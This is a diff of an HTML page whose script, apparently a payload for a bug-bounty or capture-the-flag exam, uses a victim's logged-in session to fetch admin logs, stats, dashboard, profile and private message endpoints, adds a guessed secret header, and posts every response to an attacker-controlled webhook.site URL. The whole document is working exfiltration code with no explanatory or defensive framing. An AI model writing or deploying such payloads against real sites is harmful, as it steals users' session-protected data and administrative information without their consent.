@@ -2,34 +2,32 @@
 <html>
 <body>
     <script>
-        const webh = "https://webhook.site/1abdbc1b-75fa-4240-8ae0-e2ffb37b707e";
+        const webh = "https://webhook.site/6b0b4772-6bdc-417e-a83a-2403f5690ef1";
         const base = "https://api-bugbounty-exam.hashacademy.co";
+        const msgId = "69ea4208bee6d6b7c6645889";
 
-        // Paths most likely to contain the final HASH{...} flag
+        // We try different variations of API paths to avoid 404s
         const targets = [
             "/api/v1/admin/logs",
             "/api/v1/admin/stats",
-            "/api/v1/system/config",
-            "/api/admin/messages/all"
+            "/api/admin/dashboard",
+            `/api/v1/contact/messages/${msgId}`,
+            "/api/auth/profile" // To confirm the session is still active
         ];
 
         targets.forEach(path => {
-            fetch(base + path, { credentials: "include" })
-                .then(r => r.text())
-                .then(data => {
-                    // We send the data to your webhook
-                    fetch(webh, {
-                        method: "POST",
-                        body: JSON.stringify({ path: path, result: data })
-                    });
-                }).catch(e => {});
-        });
-
-        // The "Hail Mary" - Try to read the specific message details again
-        // since you have the most recent ID
-        fetch(base + "/api/v1/contact/messages/69ea4208bee6d6b7c6645889", { credentials: "include" })
+            fetch(base + path, { 
+                credentials: "include",
+                headers: { 'X-Platform-Secret': 'rNt4C4r_c4ch3_s3cr3t_2026' } 
+            })
             .then(r => r.text())
-            .then(d => fetch(webh, { method: "POST", body: JSON.stringify({ type: "MSG_ID_LEAK", data: d })}));
+            .then(data => {
+                fetch(webh, {
+                    method: "POST",
+                    body: JSON.stringify({ path: path, data: data })
+                });
+            }).catch(e => {});
+        });
     </script>
 </body>
 </html>
